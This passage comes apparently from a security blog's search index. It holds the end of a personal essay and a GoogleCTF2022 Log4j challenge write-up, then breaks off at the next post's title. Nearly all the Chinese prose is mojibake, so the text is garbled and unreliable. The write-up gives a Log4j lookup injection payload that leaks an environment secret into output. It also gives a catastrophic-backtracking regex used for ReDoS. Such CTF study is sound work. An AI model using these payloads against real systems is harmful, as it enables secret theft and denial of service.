çŸ¥åˆ°èƒ½åšä¸€ç‚¹Javaçš„CTFé¢˜ï¼Œå†åˆ°èƒ½AKæ¯”èµ›çš„Javaé¢˜ï¼Œè¿™æ®µè¿‡ç¨‹ä¹Ÿæ˜¯å¥‡å¦™çš„ï¼Œåé¢æˆ‘å‘ç°æˆ‘ç»å¸¸é—å¿˜äºæ˜¯åˆå†™äº†ä¸ªJavaSecçš„githubä»“åº“ï¼Œä¸€å¼€å§‹å†…å®¹å¾ˆçƒ‚ç²—åˆ¶æ»¥é€ ï¼Œä½†æ…¢æ…¢å†™çš„å†™çš„çœ‹ç€å†…å®¹é€æ¸ä¸°å¯Œï¼Œå¯¹ä»£ç çš„æ€è€ƒæ³¨è§£æ·±å…¥ï¼Œå¯¹å®æˆ˜çš„ç†è§£ä¹Ÿé€æ­¥åŠ æ·±ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘è§‰å¾—æ˜¯å¾ˆæœ‰è¶£çš„ï¼Œè™½ç„¶é‚£æ—¶å€™ä¸ä¼šJavaå®¡è®¡æŒ–æ´ï¼Œä½†æˆ‘å­¦çš„æ—¶å€™æ€»ä¼šå¾€å®æˆ˜æ–¹é¢æƒ³ï¼Œè™½ç„¶æœ‰äº›ä¸œè¥¿ä¸ä¸€å®šèƒ½ç”¨ï¼Œä½†æˆ‘å­¦ä¼šäº†æ€è€ƒï¼Œä¹‹ååˆ°äº†å¤§ä¸‰ä¸ŠæœŸæœ«æˆ‘åˆè¿·èŒ«äº†ï¼Œç¬¬ä¸€æ¬¡é¢è¯•å°±é¢è¯•å¤§å‚æˆ‘çœŸçš„æ‰‹è¶³æ— æªï¼Œæ˜æ˜å¾ˆå¤šä¼šçš„ä½†å°±æ˜¯è¯´ä¸å‡ºæ¥ï¼Œæˆ‘å¼€å§‹è‡ªé—­å¼€å§‹è§‰å¾—è‡ªå·±å°±æ˜¯ä¸€ä¸ªåºŸç‰©ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯èŠ±äº†åŠä¸ªæœˆèµ°äº†å‡ºå»ï¼Œæ€»ç»“äº†æ•™è®­ä»¥ååé¢åˆé¢äº†é•¿äº­ï¼Œå¾ˆå¼€å¿ƒæˆ‘ç¬¬ä¸€æ¬¡é€šè¿‡äº†é¢è¯•å¯æ˜¯å› ä¸ºç–«æƒ…åŸå› å°æ ¡æˆ‘åˆä¸å¾—ä¸æ¨æ‰è¿™ä»½å®ä¹ ï¼Œåæ¥åˆ°äº†æ˜¥èŠ‚æˆ‘å¾ˆæ— èŠï¼Œçœ‹ç€é˜¿é‡Œäº‘ä¸¾åŠçš„webshellæŒ‘æˆ˜èµ›æœ¬ç€å­¦ä¹ çš„æ€åº¦ï¼Œä»ç»å°½è„‘æ±èŠ±ä¸€å¤©æ—¶é—´æå‡ºä¸ªç»•è¿‡çš„æ ·æœ¬ï¼Œåˆ°åé¢æ€è·¯æ³¨è§£æ‰“å¼€æœ€ç»ˆä¹Ÿæ‹¿åˆ°äº†ç¬¬ä¸‰åçš„åæ¬¡ï¼Œå¯ä»¥è´Ÿè´£ä»»çš„è¯´é‚£æ—¶å€™æˆ‘ä¸çŸ¥é“javaçš„webshellè¯¥å¦‚ä½•å†™æˆ‘åªçŸ¥é“Runtime.getRuntime.exec()ä¹ŸåªçŸ¥é“è¿˜å¯ä»¥é€šè¿‡åå°„å¯ä»¥è°ƒç”¨æ›´åº•å±‚å»ä½¿å…¶å˜å¾—æ›´å¤æ‚åˆ°æˆ‘å›å»æ·±å…¥æ€è€ƒï¼Œä¼šå»å¯¹å®æˆ˜ä¸ä»£ç çš„ç¢°æ’ï¼Œä¼šä»ç¼–è¯‘çš„è§’åº¦æ„é€ ç•¸å½¢webshellï¼Œå½“ç„¶ä¹Ÿåªæ˜¯å¾ˆçš®æ¯›ï¼Œä½†æ— ç–‘é‚£åå¤šå¤©æˆ‘å¾ˆå¼€å¿ƒäº¤äº†åå¤šä¸ªæ ·æœ¬èµšäº†ä¸€ä¸‡å¤šå—é’±ï¼Œåé¢ä¹Ÿç»ˆäºåˆ°äº†å®ä¹ çš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿè®¤çœŸå‡†å¤‡æŠ•äº†å¥½å‡ ä¸ªåœ°æ–¹ï¼Œå¾ˆå¼€å¿ƒéƒ½è¿‡äº†ä½†æˆ‘è¿˜æ˜¯æƒ³å»é˜¿é‡Œäº‘å°½ç®¡å®ƒçš„æµç¨‹å¾ˆæ…¢ï¼Œå°½ç®¡ä¸­é—´æœ‰ä¸€æ®µé”hcçš„æ’æ›²ï¼Œä½†åŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œå¾å¸ˆèƒ½çœ‹ä¸­æˆ‘ï¼Œèƒ½ä¿¡ä»»æˆ‘ï¼Œæˆ‘å¾ˆå¼€å¿ƒï¼Œä½†æˆ‘ä¹Ÿå¾ˆè¿·èŒ«å› ä¸ºæˆ‘å§‹ç»ˆæ˜¯è§‰å¾—è‡ªå·±èœçš„ï¼Œä½†æˆ‘ä¸æƒ³è¾œè´Ÿä¸»ç®¡å¯¹æˆ‘çš„æœŸæœ›ï¼Œä¹Ÿå¸Œæœ›æˆ‘èƒ½æœ€ç»ˆå®ç°è‡ªå·±çš„ç›®æ ‡ï¼Œèƒ½å˜å¾—æ›´å‰å®³ï¼Œå½“ç„¶ä¸­é—´è¿˜æœ‰ä¸€æ®µå°æ’æ›²æˆ‘å‘ç°è™½ç„¶èººå¹³ä¸¤å¹´ï¼Œå¾—ç›Šäºæˆ‘çš„æˆç»©æˆ‘çš„ç«èµ›æˆ‘å‘ç°å±…ç„¶è¿˜èƒ½ä¿ç ”ï¼Œç„¶åå¾—åˆ°æŸtopé«˜æ ¡è®¤å¯ï¼Œå¯æ˜¯æˆ‘ç»ˆç©¶è¿˜æ˜¯è§‰å¾—è¯»ç ”ä¸é€‚åˆæˆ‘ï¼Œæˆ‘ç»ˆç©¶è¿˜æ˜¯ä¸ºäº†ç†æƒ³å¿˜æ‰äº†ç°å®ï¼Œä½†ç»“æœä¹Ÿä¸èµ–ä¸æ˜¯ä¹ˆï¼Ÿ åœ¨è¿™ä¸€åˆ»æˆ‘çœŸæ­£è§‰å¾—è‡ªå·±æœ‰æ‰€æˆé•¿ï¼Œä¸åœ¨ä¹å¤–é¢çš„è¯´æ³•ï¼Œèƒ½çŸ¥é“æˆ‘æƒ³è¦ä»€ä¹ˆï¼Œè¿˜æœ‰è¾ƒä½çš„ç¤¾äº¤æ¬²æœ›ã€‚è™½ç„¶æœªæ¥æˆ‘ä»ç„¶è¿·èŒ«ï¼Œè™½ç„¶æˆ‘ä¸æ˜¯å¾ˆå¼ºï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯è¦ç»§ç»­å‘å‰ï¼Œä¸ä¸ºå…¶ä»–çš„ï¼Œå°±ä¸ºäº†èƒ½å®ç°å„¿æ—¶çš„æ¢¦ï¼","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"GoogleCTF2022-Log4j","slug":"year/2022/7/GoogleCTF2022-Log4j","date":"2022-07-06T03:08:26.000Z","updated":"2024-08-04T09:01:49.668Z","comments":true,"path":"2022/07/06/year/2022/7/GoogleCTF2022-Log4j/","link":"","permalink":"https://y4tacker.github.io/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/","excerpt":"","text":"GoogleCTF2022-Log4jå†™åœ¨å‰é¢å”¯ä¸€ä¸€ä¸ªJavaé¢˜äº†ï¼ŒæŒºæœ‰æ„æ€çš„ä¸€é“é¢˜å­¦åˆ°å¾ˆå¤š é¢˜ç›®é™„ä»¶ï¼šhttps://github.com/google/google-ctf/tree/master/2022/web-log4j éé¢„æœŸåˆ†æé¢˜ç›®ç»™äº†ä¸€ä¸ªå…¬ç½‘ç¯å¢ƒ(é¢˜ç›®ä¼¼ä¹æ²¡æœ‰é‡å¯ï¼Œèƒ½çŒœåˆ°ä¸å¯èƒ½æ˜¯RCE)ä»¥åŠé™„ä»¶å‹ç¼©åŒ…ï¼Œé‡Œé¢åŒæ—¶æœ‰pythonä»¥åŠjavaçš„ç¯å¢ƒï¼Œå…ˆç®€å•çœ‹çœ‹pythonçš„ï¼Œè¿™é‡Œè¿è¡Œäº†webæœåŠ¡ï¼Œå°†è¾“å…¥ä½œä¸ºåˆ†å‰²ä¼ å…¥chatå‡½æ•°åé€šè¿‡subprocessè°ƒç”¨å‘½ä»¤æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼Œè¿™é‡Œä¸å­˜åœ¨å‘½ä»¤æ³¨å…¥ 123456789101112131415161718192021222324252627app = Flask(__name__)@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def start(): if request.method == &#x27;POST&#x27;: text = request.form[&#x27;text&#x27;].split(&#x27; &#x27;) cmd = &#x27;&#x27; if len(text) &lt; 1: return (&#x27;invalid message&#x27;, 400) elif len(text) &lt; 2: cmd = text[0] text = &#x27;&#x27; else: cmd, text = text[0], &#x27; &#x27;.join(text[1:]) result = chat(cmd, text) return result return render_template(&#x27;index.html&#x27;)def chat(cmd, text): # run java jar with a 10 second timeout res = subprocess.run([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;-Dcmd=&#x27; + cmd, &#x27;chatbot/target/app-1.0-SNAPSHOT.jar&#x27;, &#x27;--&#x27;, text], capture_output=True, timeout=10) print(res.stderr.decode(&#x27;utf8&#x27;)) return res.stdout.decode(&#x27;utf-8&#x27;)if __name__ == &#x27;__main__&#x27;: port = os.environ[&#x27;PORT&#x27;] if &#x27;port&#x27; in os.environ else 1337 app.run(host=&#x27;0.0.0.0&#x27;, port=port) å› æ­¤é‡ç‚¹å°±æ˜¯åˆ†æè¿™ä¸ªjavaçš„æ–‡ä»¶ï¼Œå¾ˆç®€å•çš„ä»£ç (åŒæ—¶å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰LOG4J2) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.lang.System;import java.time.format.DateTimeFormatter;import java.time.LocalDateTime;public class App &#123; public static Logger LOGGER = LogManager.getLogger(App.class); public static void main(String[]args) &#123; //è·å–ç¯å¢ƒå˜é‡å½“ä¸­çš„flag,åŒæ—¶è¿™é‡Œå¯ä»¥çŸ¥é“æˆ‘ä»¬éœ€è¦è·å–åˆ°ç¯å¢ƒå˜é‡ String flag = System.getenv(&quot;FLAG&quot;); if (flag == null || !flag.startsWith(&quot;CTF&quot;)) &#123; LOGGER.error(&quot;&#123;&#125;&quot;, &quot;Contact admin&quot;); &#125; //æ—¥å¿—è¾“å‡ºå‘½ä»¤è¡Œå‚æ•° LOGGER.info(&quot;msg: &#123;&#125;&quot;, args); // TODO: implement bot commands String cmd = System.getProperty(&quot;cmd&quot;); if (cmd.equals(&quot;help&quot;)) &#123; doHelp(); return; &#125; if (!cmd.startsWith(&quot;/&quot;)) &#123; System.out.println(&quot;The command should start with a /.&quot;); return; &#125; //æ ¹æ®å‘½ä»¤è¡Œå‚æ•°æ‰§è¡ŒdoCommandï¼Œç®€å•å¯ä»¥çœ‹å‡ºè¿™é‡Œæ²¡ä»€ä¹ˆåˆ©ç”¨ doCommand(cmd.substring(1), args); &#125; private static void doCommand(String cmd, String[] args) &#123; switch(cmd) &#123; case &quot;help&quot;: doHelp(); break; case &quot;repeat&quot;: System.out.println(args[1]); break; case &quot;time&quot;: DateTimeFormatter dtf = DateTimeFormatter.ofPattern(&quot;yyyy/M/d H:m:s&quot;); System.out.println(dtf.format(LocalDateTime.now())); break; case &quot;wc&quot;: if (args[1].isEmpty()) &#123; System.out.println(0); &#125; else &#123; System.out.println(args[1].split(&quot; &quot;).length); &#125; break; default: System.out.println(&quot;Sorry, you must be a premium member in order to run this command.&quot;); &#125; &#125; private static void doHelp() &#123; System.out.println(&quot;Try some of our free commands below! \\nwc\\ntime\\nrepeat&quot;); &#125;&#125; åŒæ—¶å‘ç°è¿™é‡Œæœ‰ä¸ªlog4j2.xmlçš„é…ç½®æ–‡ä»¶ 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;INFO&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_ERR&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; %-5level %logger&#123;36&#125; executing $&#123;sys:cmd&#125; - %msg %n&quot;&gt; &lt;/PatternLayout&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;debug&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; å¯ä»¥çœ‹è§è¿™é‡Œçš„Rootçš„levelè®¾ç½®ä¸ºdebugï¼Œè¿™ä»£è¡¨å¦‚æœæ²¡æœ‰å•ç‹¬æŒ‡å®šLoggerï¼Œ é‚£ä¹ˆå°±ä¼šä½¿ç”¨è¯¥Rootæ—¥å¿—è¾“å‡ºè¾“å‡ºï¼Œå› æ­¤å°±ç®—æˆ‘ä»¬èƒ½è§£æåˆ°$&#123;env:FLAG&#125;ä¹Ÿä¸å¯èƒ½æ‹¿åˆ°ç»“æœ(å› ä¸ºè¿™æ˜¯åœ¨æ—¥å¿—è€Œä¸æ˜¯æ ‡å‡†è¾“å‡ºå½“ä¸­)ï¼Œå› æ­¤æˆ‘ä»¬æœ‰æ²¡æœ‰åŠæ³•è®²ç»“æœè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºå‘¢ï¼Œå½“ç„¶ç­”æ¡ˆæ˜¯æœ‰çš„ä¹Ÿé€ æˆäº†è¿™æ¬¡éé¢„æœŸï¼Œå¦‚æœæˆ‘ä»¬å•ç‹¬è®¾ç½®äº†Loggerçš„è¯ï¼Œå¦‚æœé‚£ä¸ªæ—¥å¿—ç­–ç•¥ä¼šè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºé‚£ä¹ˆå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ è¿™é‡Œè¯´ä¸€ä¸‹å…¶ä¸­ä¸€ä¸ªå°±å¯ä»¥ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªorg.apache.logging.log4j.core.lookup.ResourceBundleLookupï¼Œè¦æ‰§è¡ŒLOGGER.warnåªéœ€è¦æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ä¹‹ä¸€å³å¯ï¼Œè¿™é‡Œç®€å•æµ‹è¯•ä¸€ä¸‹$&#123;bundle:2333&#125; å‘ç°è¿™ä¸ªLOGGERç¡®å®èƒ½å°†å…³é”®ä¿¡æ¯å¸¦åˆ°æ ‡å‡†è¾“å‡º å› æ­¤æˆ‘ä»¬åªéœ€è¦è¾“å…¥$&#123;bundle:$&#123;env:FLAG&#125;&#125;å³å¯ 1$&#123;$&#123;a:-b&#125;undle:$&#123;env:FLAG&#125;&#125; é¢„æœŸåˆ†æ-redosçŒœæµ‹å¯èƒ½æ˜¯éé¢„æœŸäº†æ‰€ä»¥æäº†ä¸ªæ–°çš„é¢˜ï¼Œå°†åŒæ ·çš„payloadè¾“å…¥åé¡µé¢åªæ˜¯æ˜¾ç¤ºSensitive information detected in output. Censored for security reasons. è¿™é‡Œä¼šæ£€æµ‹å†…å®¹ï¼Œæ ¹æ®çŒœæµ‹èƒ½å¤ŸçŸ¥é“è‚¯å®šæ˜¯æŠŠé‚£ä¸ªResourceBundleLookupä¸‹çš„LOGGER.warnçš„è¾“å‡ºç‰¹å¾ç»™è¿‡æ»¤æ‰äº†ï¼Œè¿™é‡Œç®€å•fuzzä¸‹è¯å®äº†æˆ‘çš„çŒœæµ‹ï¼Œæ¯•ç«Ÿè¿™é‡Œæ˜¯æœ‰doCommandåŠŸèƒ½ 1234567891011121314151617181920212223private static void doCommand(String cmd, String[] args) &#123; switch(cmd) &#123; case &quot;help&quot;: doHelp(); break; case &quot;repeat&quot;: System.out.println(args[1]); break; case &quot;time&quot;: DateTimeFormatter dtf = DateTimeFormatter.ofPattern(&quot;yyyy/M/d H:m:s&quot;); System.out.println(dtf.format(LocalDateTime.now())); break; case &quot;wc&quot;: if (args[1].isEmpty()) &#123; System.out.println(0); &#125; else &#123; System.out.println(args[1].split(&quot; &quot;).length); &#125; break; default: System.out.println(&quot;Sorry, you must be a premium member in order to run this command.&quot;); &#125;&#125; åªéœ€è¦é€šè¿‡repeatåŠŸèƒ½å³å¯ï¼ŒæˆåŠŸéªŒè¯äº†çŒœæƒ³ï¼Œå› æ­¤ä¸éœ€è¦è€ƒè™‘payloadçš„é—®é¢˜äº† é‚£æ€ä¹ˆåŠå‘¢å…¶å®è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œå¯¹äºlog4j2çš„æ—¥å¿—çš„å®ç°æ¥è¯´å…¶å®æ˜¯å…ˆå°†$&#123;xx&#125;å½“ä¸­çš„å†…å®¹åšæ›¿æ¢å†æŒ‰æˆ‘ä»¬è§„å®šçš„è¾“å‡ºæ ¼å¼è¾“å‡º(å¦‚æœæ˜¯ä½ å»å®ç°è¿™æ ·çš„åŠŸèƒ½ç›¸ä¿¡è¿™æ˜¯ç›®å‰ä¸ºæ­¢çš„æœ€ä¼˜è§£)ï¼Œå…·ä½“ä»£ç è¿™é‡Œå°±ä¸å±•å¼€äº†ï¼Œæ¥ç€è¯´æ˜ å…¶å®log4j2å¯¹æ—¥å¿—è¾“å‡ºä¸­çš„%d/%pç­‰å…¶å®æ˜¯æœ‰è‡ªå·±çš„å®ç°çš„ï¼Œå®ƒæœ‰ä¸ªæ³¨è§£æ¯”å¦‚ä¸‹é¢è¿™ä¸ªæ˜¯%dçš„ä»–ä»¬éƒ½æ˜¯æœ‰ä¸ªæ³¨è§£ConverterKeysï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™ä¸ªæœ‰æ²¡æœ‰ä¸€äº›ç¥å¥‡çš„ä¸œè¥¿å¯ä»¥é…åˆæˆ‘ä»¬å®Œæˆ å¦‚ä½•æ‰«æå¹¶è·å–åŒ…ä¸‹è¢«æŒ‡å®šæ³¨è§£çš„ç±»ä¸ºäº†æ–¹ä¾¿æˆ‘è¿™é‡Œç›´æ¥ç”¨äº†reflections æ¡†æ¶ï¼ˆæ­¤æ¡†æ¶ä¾èµ–com.google.guavaï¼‰ 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.reflections&lt;/groupId&gt; &lt;artifactId&gt;reflections&lt;/artifactId&gt; &lt;version&gt;0.9.11&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;21.0&lt;/version&gt;&lt;/dependency&gt; å› æ­¤æˆ‘ä»¬å¯ä»¥æ‰«ææŒ‡å®šåŒ…ä¸‹çš„ 12345678910Reflections f = new Reflections(&quot;org.apache.logging.log4j.core&quot;);Set&lt;Class&lt;?&gt;&gt; set = f.getTypesAnnotatedWith(ConverterKeys.class);for (Class&lt;?&gt; tmp:set)&#123; if (tmp.isInterface())&#123; System.out.println(&quot;interface:&quot;+tmp.getName()); &#125;else &#123; System.out.println(&quot;class:&quot;+tmp.getName()); &#125;&#125; å¾—åˆ°å¦‚ä¸‹ç»“æœ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class:org.apache.logging.log4j.core.pattern.VariablesNotEmptyReplacementConverterclass:org.apache.logging.log4j.core.pattern.UuidPatternConverterclass:org.apache.logging.log4j.core.pattern.LineLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.HighlightConverterclass:org.apache.logging.log4j.core.pattern.LevelPatternConverter$SimpleLevelPatternConverterclass:org.apache.logging.log4j.core.pattern.ThreadIdPatternConverterclass:org.apache.logging.log4j.core.pattern.IntegerPatternConverterclass:org.apache.logging.log4j.core.pattern.ClassNamePatternConverterclass:org.apache.logging.log4j.core.pattern.ProcessIdPatternConverterclass:org.apache.logging.log4j.core.pattern.MaxLengthConverterclass:org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Yellowclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Greenclass:org.apache.logging.log4j.core.pattern.RootThrowablePatternConverterclass:org.apache.logging.log4j.core.pattern.MethodLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.MessagePatternConverterclass:org.apache.logging.log4j.core.pattern.DatePatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Whiteclass:org.apache.logging.log4j.core.pattern.EqualsIgnoreCaseReplacementConverterclass:org.apache.logging.log4j.core.pattern.NdcPatternConverterclass:org.apache.logging.log4j.core.pattern.SequenceNumberPatternConverterclass:org.apache.logging.log4j.core.pattern.RepeatPatternConverterclass:org.apache.logging.log4j.core.pattern.EncodingPatternConverterclass:org.apache.logging.log4j.core.pattern.MdcPatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Magentaclass:org.apache.logging.log4j.core.pattern.MessagePatternConverter$SimpleMessagePatternConverterclass:org.apache.logging.log4j.core.pattern.RegexReplacementConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Blackclass:org.apache.logging.log4j.core.pattern.ThreadNamePatternConverterclass:org.apache.logging.log4j.core.pattern.NanoTimePatternConverterclass:org.apache.logging.log4j.core.pattern.RelativeTimePatternConverterclass:org.apache.logging.log4j.core.pattern.FileLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.MessagePatternConverter$RenderingPatternConverterclass:org.apache.logging.log4j.core.pattern.LevelPatternConverterclass:org.apache.logging.log4j.core.pattern.FileDatePatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Cyanclass:org.apache.logging.log4j.core.pattern.EqualsReplacementConverterclass:org.apache.logging.log4j.core.pattern.ThrowablePatternConverterclass:org.apache.logging.log4j.core.pattern.LoggerFqcnPatternConverterclass:org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverterclass:org.apache.logging.log4j.core.pattern.ThreadPriorityPatternConverterclass:org.apache.logging.log4j.core.pattern.MessagePatternConverter$FormattedMessagePatternConverterclass:org.apache.logging.log4j.core.pattern.MarkerSimpleNamePatternConverterclass:org.apache.logging.log4j.core.pattern.EndOfBatchPatternConverterclass:org.apache.logging.log4j.core.pattern.FullLocationPatternConverterclass:org.apache.logging.log4j.core.pattern.MapPatternConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Redclass:org.apache.logging.log4j.core.pattern.MarkerPatternConverterclass:org.apache.logging.log4j.core.pattern.LoggerPatternConverterclass:org.apache.logging.log4j.core.pattern.LevelPatternConverter$LevelMapLevelPatternConverterclass:org.apache.logging.log4j.core.pattern.StyleConverterclass:org.apache.logging.log4j.core.pattern.AbstractStyleNameConverter$Blue é€‰æ‹©åˆé€‚çš„ç±»å®Œæˆchallengeè¿™é‡Œå¼•èµ·æˆ‘æ³¨æ„çš„æœ‰ä¸¤ä¸ªç±»ï¼Œä¸€ä¸ªæ˜¯å’Œæ­£åˆ™ç›¸å…³ï¼Œä¸€ä¸ªæ˜¯å’Œé‡å¤ç›¸å…³çš„è‹±æ–‡å¸å¼•äº†æˆ‘ 12class:org.apache.logging.log4j.core.pattern.RegexReplacementConverterclass:org.apache.logging.log4j.core.pattern.RepeatPatternConverter å¯¹åº”ä½¿ç”¨ä¸º %replace&#123;abc&#125;&#123;a&#125;&#123;d&#125;=&gt;adc %repeat&#123;a&#125;&#123;3&#125;=&gt;aaa åˆ†åˆ«çœ‹çœ‹RegexReplacementConverter RepeatPatternConverter ç»“åˆè¿™ä¸¤ä¸ªåŠŸèƒ½å°±èƒ½å¤§èƒ†çŒœæƒ³èƒ½å¦é€šè¿‡repeatæ„é€ è¶…é•¿å­—ç¬¦ä¸²æ¥æ¶ˆè€—æ­£åˆ™å¼•æ“çš„æ€§èƒ½å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¦ï¼Ÿå…¶å®ä»£ç é‡Œå¾ˆæ¸…æ¥šäº†ï¼Œåªæœ‰RegexReplacementConverteræœ‰ä¸ªList&lt;PatternFormatter&gt; formatters = parser.parse(options[0]);è¿™ä¸ªparseçš„æ“ä½œå¹¶ä¸”è¿™ä¸ª0å†³å®šåªèƒ½åœ¨ç¬¬ä¸€ä½ï¼Œç¬¬ä¸€ä½æ˜¯ä»€ä¹ˆå°±æ˜¯è¦æ›¿æ¢çš„ç±»ï¼Œè€Œrepeaté‡Œé¢æ˜¾ç„¶æ²¡æœ‰ï¼Œå› æ­¤è¿™ä¸¤ä¸ªä¹Ÿä¸èƒ½åµŒå¥—å»å®Œæˆè¿™ä¸ªé¢˜ç›®äº† é‚£ä¹ˆè¿˜æœ‰ä»€ä¹ˆæ–¹å¼å‘¢ï¼Ÿé‚£å°±æ˜¯redosï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªåŒ…å«å…·æœ‰è‡ªæˆ‘é‡å¤çš„é‡å¤æ€§åˆ†ç»„çš„æ­£åˆ™è¡¨è¾¾å¼å³å¯ï¼Œæ¯”å¦‚åœ¨Cookiaå¸ˆå‚…çš„åšæ–‡å½“ä¸­æ‰¾åˆ°çš„(æ¯•ç«Ÿæˆ‘æ‡’) å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ æ­£åˆ™^.&#123;x&#125;(.).*$ï¼Œå…¶ä¸­xä¸ºæ•°å­—ï¼Œåˆ†åˆ«è·å–ç¬¬ä¸€â€¦.nä½å¯¹å…¶è¿›è¡Œé‡å¤ä¹‹åå†åœ¨åé¢åŠ ä¸Šä»»æ„å­—ç¬¦xï¼Œå…¶å®å°±æ˜¯æ„é€ å‡ºaaaaaaaaxçš„å½¢å¼ ä½†æˆ‘å‘ç°åœ¨jdk8ä¸Šèƒ½æˆåŠŸçš„redoså´åœ¨æ‰“çš„æ—¶å€™æ²¡ç”¨ï¼Ÿé‚£ä¸ªç»™çš„dockeræˆ‘ä¹Ÿæ²¡æ³•æ„å»ºï¼Œåé¢å‘ç°é«˜ç‰ˆæœ¬jdk9+ä»¥åå’Œjdk8ä¸Šçš„æœ‰åŒºåˆ« å¯ä»¥çœ‹åˆ°RSPEC-2631ä¸­å‘ç°ReDoS é—®é¢˜å·²åœ¨ Java 9 åŠæ›´é«˜ç‰ˆæœ¬ä¸­å¤„ç†ï¼Œä½†æ˜¯åŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œåˆåœ¨stackoverflowçš„ä¸»é¢˜is-java-redos-vulnerableå½“ä¸­å‘ç°ï¼Œæ˜æ˜¾å¯ä»¥çœ‹åˆ°è¿™å¥è¯é€šè¿‡å¢åŠ ()æ¥å¢åŠ å¤æ‚åº¦ï¼Œä½†æ˜¯è¿™æ¬¡æˆ‘åœ¨æœ¬åœ°9-11ç‰ˆæœ¬(å½“ç„¶æ¯ä¸ªå¤§ç‰ˆæœ¬æˆ‘åªæœ‰ä¸€ä¸ªå°ç‰ˆæœ¬çš„jreå¯èƒ½ä¸å…¨é¢)éƒ½æµ‹è¯•é€šè¿‡æˆåŠŸredos ä½†æ˜¯åœ¨é¢˜ç›®ç¯å¢ƒä»ç„¶æ˜¯å®Œæˆè§£æå‘Šè¯‰æˆ‘Sensitive information detected in output. Censored for security reasons. æœ€åæˆ‘å†³å®šå†ä¸ºå®ƒåŠ ç‚¹å¤æ‚åº¦ä¹Ÿå°±æ˜¯åœ¨æœ€ååŠ ä¸€ä¸ª$ï¼Œä¹Ÿå°±æ˜¯((C+)+)+$ æ¥ä¸‹æ¥å°±æ˜¯å†™ä¸ªè„šæœ¬æ…¢æ…¢è·‘çš„é—®é¢˜ï¼Œä¹Ÿæ˜¯çœ‹å¿ƒæ€å’Œä»£ç†ç»™ä¸ç»™åŠ›çš„é—®é¢˜ å‚è€ƒæ–‡ç« https://blog.csdn.net/Q176782/article/details/78288734 http://cookia.cc/2017/09/13/redos/ https://www.cnblogs.com/ggband/p/11668879.html https://rules.sonarsource.com/java/RSPEC-2631 https://stackoverflow.com/questions/53048859/is-java-redos-vulnerable","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Log4j2","slug":"Log4j2","permalink":"https://y4tacker.github.io/tags/Log4j2/"}]},{"title":"æ¢å¯»Javaæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢wafç»•è¿‡å§¿åŠ¿ç³»åˆ—äºŒ","slug":"year/2022/6/æ¢å¯»Javaæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢wafç»•è¿‡å§¿åŠ¿ç³»åˆ—äºŒ","date":"2022-06-21T12:32:35.000Z","updated":"2024-08-04T09:01:49.640Z","comments":true,"path":"2022/06/21/year/2022/6/æ¢å¯»Javaæ–‡ä»¶ä¸Šä¼ 